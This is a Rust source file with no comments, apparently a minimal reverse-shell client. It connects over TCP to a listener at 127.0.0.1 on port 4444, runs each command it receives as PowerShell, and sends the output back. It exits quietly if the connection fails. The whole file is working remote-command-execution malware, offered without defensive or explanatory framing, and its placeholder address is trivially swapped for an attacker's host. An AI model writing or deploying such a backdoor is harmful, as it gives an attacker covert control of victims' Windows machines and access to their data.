use std::net::TcpStream;
use std::io::{Read, Write};
use std::str::{from_utf8, from_utf8_unchecked};
use std::process;

use powershell_script;


fn main() {

    let ip: &str = "127.0.0.1";
    let port: i32 = 4444;

    let mut buff = [0; 1024];

    match TcpStream::connect(&format!("{}:{}", ip, port)) {
        Ok(mut stream) => {
            loop {
                let size = stream.read(&mut buff).unwrap();

                match powershell_script::run(from_utf8(&mut buff[0..size]).unwrap()){
                    Ok(shell) => {
                        if &shell.stdout().is_none() == &true {
                            continue;

                        }else {
                            stream.write(&shell
                                .stdout()
                                .unwrap()
                                .as_bytes());

                        }

                    },

                    Err(_) => {
                        continue;

                    }
                }
            }
        },

        Err(_) => {
            process::exit(0);

        },

    }

}
